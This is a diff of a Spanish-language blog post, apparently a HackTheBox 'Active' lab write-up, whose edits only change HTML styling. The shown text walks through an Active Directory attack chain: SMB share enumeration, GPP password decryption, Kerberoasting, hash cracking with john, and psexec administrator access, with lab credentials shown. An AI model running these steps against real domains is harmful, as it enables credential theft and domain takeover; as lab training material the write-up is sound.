@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/active/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">active</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">active</code> AD de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">active</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">active</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack active
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.100
 </code></pre></div></div>
@@ -63,7 +63,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 49169/tcp open  unknown
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49168,49169 <span class="nt">-sCV</span> 10.10.10.100 <span class="nt">-oN</span> versions
 </code></pre></div></div>
@@ -100,14 +100,14 @@ Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</spa
 
 <h2 id="ad-domain-detection">AD DOMAIN DETECTION</h2>
 
-<p>Iniciamos con la detección del <code class="highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
+<p>Iniciamos con la detección del <code class="language-plaintext highlighter-rouge">dominio</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> enumeramos información necesaria para tener un mejor alcance a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100
 </code></pre></div></div>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
 </code></pre></div></div>
 
-<p>Agregamos en el archivo <code class="highlighter-rouge">/etc/hosts</code></p>
+<p>Agregamos en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
 nvim /etc/hosts
@@ -136,7 +136,7 @@ nvim /etc/hosts
 	Users           Disk
 </code></pre></div></div>
 
-<p>Revisamos los archivos con capacidad de lectura, encontrando <code class="highlighter-rouge">groups.xml</code>, el cual contiene una credencial codificada, por lo tanto descargamos este archivo en nuestra máquina.</p>
+<p>Revisamos los archivos con capacidad de lectura, encontrando <code class="language-plaintext highlighter-rouge">groups.xml</code>, el cual contiene una credencial codificada, por lo tanto descargamos este archivo en nuestra máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> <span class="s2">"Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"</span>
 </code></pre></div></div>
@@ -147,7 +147,7 @@ nvim /etc/hosts
 
 <h2 id="decrypt-groupsxml-password">DECRYPT GROUPS.XML PASSWORD</h2>
 
-<p>Vamos a proceder a desencriptar esta credencial para el usuario <code class="highlighter-rouge">SVC_TGS</code> con la utilidad <code class="highlighter-rouge">gpp-decrypt</code></p>
+<p>Vamos a proceder a desencriptar esta credencial para el usuario <code class="language-plaintext highlighter-rouge">SVC_TGS</code> con la utilidad <code class="language-plaintext highlighter-rouge">gpp-decrypt</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>groups.xml
 </code></pre></div></div>
@@ -158,7 +158,7 @@ nvim /etc/hosts
 
 <h2 id="granted-smb-access-svc_tgs-user">GRANTED SMB ACCESS SVC_TGS USER</h2>
 
-<p>Tenemos una credencial! Es momento de ponerlo a prueba con la utilidad <code class="highlighter-rouge">crackmapexec</code> por medio del protocolo <code class="highlighter-rouge">smb</code>, donde tenemos acceso a más recursos compartidos.</p>
+<p>Tenemos una credencial! Es momento de ponerlo a prueba con la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> por medio del protocolo <code class="language-plaintext highlighter-rouge">smb</code>, donde tenemos acceso a más recursos compartidos.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
 </code></pre></div></div>
@@ -184,7 +184,7 @@ SMB         10.10.10.100    445    DC               Users           READ
 
 <h2 id="flag-usertxt-smb">FLAG USER.TXT (SMB)</h2>
 
-<p>Luego de revisar los archivos, encontramos la flag <code class="highlighter-rouge">user.txt</code>, siendo así descargamos el archivo y lo miramos en nuestra máquina atacante.</p>
+<p>Luego de revisar los archivos, encontramos la flag <code class="language-plaintext highlighter-rouge">user.txt</code>, siendo así descargamos el archivo y lo miramos en nuestra máquina atacante.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop/user.txt
 </code></pre></div></div>
@@ -197,7 +197,7 @@ SMB         10.10.10.100    445    DC               Users           READ
 
 <h2 id="ad-enum-rpcclient-with-creds">AD ENUM RPCCLIENT (WITH CREDS)</h2>
 
-<p>Ahora que tenemos credenciales, vamos a realizar una enumeración por <code class="highlighter-rouge">RPC</code> con la utilidad <code class="highlighter-rouge">rpcclient</code></p>
+<p>Ahora que tenemos credenciales, vamos a realizar una enumeración por <code class="language-plaintext highlighter-rouge">RPC</code> con la utilidad <code class="language-plaintext highlighter-rouge">rpcclient</code></p>
 
 <h3 id="enumeración-de-usuarios-null-session">ENUMERACIÓN DE USUARIOS NULL SESSION</h3>
 
@@ -279,7 +279,7 @@ index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <sp
 
 <h2 id="kerbrute-install">KERBRUTE INSTALL</h2>
 
-<p>Instalamos la utilidad <code class="highlighter-rouge">kerbrute</code> para poder enumerar usuarios por medio del protocolo <code class="highlighter-rouge">kerberos</code></p>
+<p>Instalamos la utilidad <code class="language-plaintext highlighter-rouge">kerbrute</code> para poder enumerar usuarios por medio del protocolo <code class="language-plaintext highlighter-rouge">kerberos</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone http://github.com/ropnop/kerbrute
 <span class="nb">cd </span>kerbrute
@@ -291,7 +291,7 @@ upx kerbrute
 
 <h2 id="tgt-kerbrute-enum">TGT KERBRUTE ENUM</h2>
 
-<p>Procedemos con la emumeración de usuarios que capturamos anteriormente en el archivo <code class="highlighter-rouge">users.txt</code></p>
+<p>Procedemos con la emumeración de usuarios que capturamos anteriormente en el archivo <code class="language-plaintext highlighter-rouge">users.txt</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> active.htb <span class="nt">--dc</span> 10.10.10.100 users.txt
 </code></pre></div></div>
@@ -314,7 +314,7 @@ Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/12/23 - Ro
 
 <h2 id="ad-tgt-getnpuserspy">AD TGT GETNPUSERS.PY</h2>
 
-<p>Otra manera de enumerar usuarios validos del dominio es con la utilidad <code class="highlighter-rouge">GetNPUsers</code> de la suite de <code class="highlighter-rouge">Impacket</code>, en esta ocasión podemos corroborar los dos usuarios validos encontrados anteriormente.</p>
+<p>Otra manera de enumerar usuarios validos del dominio es con la utilidad <code class="language-plaintext highlighter-rouge">GetNPUsers</code> de la suite de <code class="language-plaintext highlighter-rouge">Impacket</code>, en esta ocasión podemos corroborar los dos usuarios validos encontrados anteriormente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
 </code></pre></div></div>
@@ -328,7 +328,7 @@ Version: dev <span class="o">(</span>n/a<span class="o">)</span> - 01/12/23 - Ro
 
 <h2 id="getuserspns-enum-kerberoasting-attack">GETUSERSPNS ENUM (KERBEROASTING ATTACK)</h2>
 
-<p>Ahora que tenemos credenciales, vamos a sacar provecho y capturar el hash <code class="highlighter-rouge">NTMLv2</code> en caso de que sea posible, para que, posteriormente logremos por fuerza bruta romper este hash y obtener una contraseña en texto plano. Primero se consulta si es posible obtener el hash y luego lo solicitamos, todo por medio de la utilidad <code class="highlighter-rouge">GetUserSPNs</code></p>
+<p>Ahora que tenemos credenciales, vamos a sacar provecho y capturar el hash <code class="language-plaintext highlighter-rouge">NTMLv2</code> en caso de que sea posible, para que, posteriormente logremos por fuerza bruta romper este hash y obtener una contraseña en texto plano. Primero se consulta si es posible obtener el hash y luego lo solicitamos, todo por medio de la utilidad <code class="language-plaintext highlighter-rouge">GetUserSPNs</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs <span class="s2">"active.htb/SVC_TGS:GPPstillStandingStrong2k18"</span> <span class="nt">-dc-ip</span> 10.10.10.100
 </code></pre></div></div>
@@ -354,7 +354,7 @@ active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=
 
 <h2 id="bruteforce-administrator-hash">BRUTEFORCE ADMINISTRATOR HASH</h2>
 
-<p>Capturamos el hash y lo guardamos en un archivo homonimo <code class="highlighter-rouge">hash</code>, luego lo rompemos con la utilidad <code class="highlighter-rouge">john</code></p>
+<p>Capturamos el hash y lo guardamos en un archivo homonimo <code class="language-plaintext highlighter-rouge">hash</code>, luego lo rompemos con la utilidad <code class="language-plaintext highlighter-rouge">john</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs <span class="s2">"active.htb/SVC_TGS:GPPstillStandingStrong2k18"</span> <span class="nt">-dc-ip</span> 10.10.10.100 <span class="nt">-request</span> | <span class="nb">tail</span> <span class="nt">-n</span> 1 <span class="o">&gt;</span> <span class="nb">hash</span>
 </code></pre></div></div>
@@ -369,7 +369,7 @@ Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
 
 <h2 id="granted-access-administrator-user">GRANTED ACCESS ADMINISTRATOR USER</h2>
 
-<p>Tenemos la credencial del usuario <code class="highlighter-rouge">Administrator</code>, ahora vamos a validarlo por <code class="highlighter-rouge">smb</code> con la utilidad <code class="highlighter-rouge">crackmapexec</code> y ya obteniendo un acceso como administrador <code class="highlighter-rouge">Pwn3d</code>, procedemos con la utilidad <code class="highlighter-rouge">impacket-psexec</code> a entablar una conexión directamente con la máquina víctima.</p>
+<p>Tenemos la credencial del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a validarlo por <code class="language-plaintext highlighter-rouge">smb</code> con la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code> y ya obteniendo un acceso como administrador <code class="language-plaintext highlighter-rouge">Pwn3d</code>, procedemos con la utilidad <code class="language-plaintext highlighter-rouge">impacket-psexec</code> a entablar una conexión directamente con la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
 </code></pre></div></div>
@@ -383,7 +383,7 @@ SMB         10.10.10.100    445    DC               <span class="o">[</span>+] a
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:/
 C:<span class="se">\&gt;</span><span class="nb">dir</span> /b/s user.txt
@@ -400,9 +400,9 @@ echo.%root:~0,10%
 aa4beed1c0
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">active</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">active</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/active/03-finish.png" />
 </p>
 
